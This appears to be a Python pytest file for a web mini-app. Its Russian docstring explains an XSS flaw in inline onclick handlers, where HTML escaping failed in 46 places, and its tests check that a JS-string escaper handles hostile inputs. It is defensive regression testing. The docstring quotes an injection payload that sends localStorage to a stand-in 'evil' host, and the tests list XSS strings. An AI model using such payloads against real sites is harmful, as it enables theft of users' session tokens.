"""В обработчиках разметки (onclick="f('${…}')") строки идут через escJs.

esc() там не защищает: браузер раскодирует &#39; в значении атрибута обратно в
апостроф ДО запуска кода. Имя канала, бота, контакта или участника рабочего
пространства вида «x');fetch('//evil?'+localStorage.…);//» выходило из строки
и исполнялось в сессии владельца — с его токеном и его флотом. Так было в 46
местах. Тест падает без фикса: он находит `'${esc(…)}'` внутри on*="…".
"""
from __future__ import annotations

import glob
import os
import re
import shutil
import subprocess

import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
FILES = [os.path.join(ROOT, "mini_app", "index.html")] + sorted(
    glob.glob(os.path.join(ROOT, "mini_app", "screens", "*.js")))
_ATTR = re.compile(r"\bon[a-z]+=\"[^\"\n]*")


def test_no_html_escaped_strings_inside_inline_handlers():
    bad = []
    for f in FILES:
        for i, line in enumerate(open(f, encoding="utf-8"), 1):
            for m in _ATTR.finditer(line):
                if "'${esc(" in m.group(0):
                    bad.append(f"{os.path.basename(f)}:{i}")
    assert not bad, "esc() внутри JS-строки обработчика — нужен escJs(): " + ", ".join(bad[:20])


@pytest.mark.skipif(not (shutil.which("node") or os.path.exists("/opt/node22/bin/node")),
                    reason="нет node")
def test_escjs_round_trips_hostile_strings():
    node = shutil.which("node") or "/opt/node22/bin/node"
    src = open(FILES[0], encoding="utf-8").read()
    fn = re.search(r"function escJs\(s\) \{[\s\S]*?\n\}\n", src).group(0)
    script = fn + r"""
const evil = ["x');alert(1);//", 'a"b', '</script><b>', '\\', '&#39;', 'l m', '`${1}`'];
for (const e of evil) {
  const lit = "'" + escJs(e) + "'";
  if (/['"<>&]/.test(escJs(e))) throw new Error('raw char survived: ' + e);
  if (eval(lit) !== e) throw new Error('round trip: ' + e);
}
console.log('ok');
"""
    r = subprocess.run([node, "-e", script], capture_output=True, text=True, timeout=30)
    assert r.returncode == 0 and "ok" in r.stdout, r.stderr
